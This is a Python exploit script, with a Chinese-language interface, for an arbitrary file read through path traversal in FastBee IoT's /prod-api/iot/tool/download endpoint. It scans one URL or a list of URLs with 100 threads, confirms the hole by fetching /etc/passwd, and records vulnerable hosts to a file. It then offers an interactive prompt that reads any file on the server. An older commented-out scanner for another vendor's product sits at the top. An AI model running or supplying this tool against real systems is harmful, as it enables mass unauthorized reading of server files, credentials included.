# import sys,argparse,requests,re
# requests.packages.urllib3.disable_warnings()
# from multiprocessing.dummy import Pool
# def banner():
#     banner = """
#              ____  ____  _     _     ____
#         /  _ \/  _ \/ \ /|/ \ /\/  _ \
#         | | \|| / \|| |_||| | ||| / \|
#         | |_/|| |-||| | ||| \_/|| |-||
#         \____/\_/ \|\_/ \|\____/\_/ \|
#
#
#
#     """
#     print(banner)
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="辰信景云终端安全漏洞扫描工具")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
# def poc(target):
#     payload = '/admin/user_getUserInfoByUserName.action?userName=system'
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Accept-Encoding": "gzip,deflate",
#         "Upgrade-Insecure-Requests": "1",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "Sec-Fetch-Site": "none",
#         "Sec-Fetch-User":"?1",
#         "Priority": "u=0,i",
#         "Te": "trailers",
#         "Connection": "close",
#     }
#     try:
#         res1 = requests.get(url=target+payload, headers=headers, verify=False)
#         print(res1.txt)
#     except Exception as e:
#         print(e)

import sys
import argparse
import requests
import re
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|



                            version:1.1.0
                            author:fangwei   
    """
    logging.info(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="fastbee")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd'
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target, timeout=5, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, verify=False, timeout=5)
            if "root" in res2.text:
                logging.info(f"{GREEN}[+] 该网站 {target} 存在任意文件读取漏洞{RESET}")
                with open("result2.txt", "a", encoding='utf-8') as f:
                    f.write(f"[+] 该网站 {target} 存在任意文件读取漏洞\n")
                return True
            else:
                logging.info(f"[-] 该网站 {target} 不存在任意文件读取漏洞")
        else:
            logging.warning("连接超时")
    except Exception as e:
        logging.error(f"[*] 该网站存在问题: {target}, 错误信息: {e}")


def exp(target):
    while True:
        cmd = input("请输入要查看的文件 (q退出)\n>>>>>>>>>>>> ")
        if cmd.lower() == 'q':
            exit()
        payload = f'/prod-api/iot/tool/download?fileName=/../../../..{cmd}'
        try:
            res = requests.get(url=target + payload, verify=False, timeout=5)
            if res.text == "":
                logging.info("文件不存在")
            else:
                logging.info("文件内容如下:\n" + res.text)
        except Exception as e:
            logging.error(f"[*] 访问文件时出现问题: {target}, 错误信息: {e}")


if __name__ == '__main__':
    main()
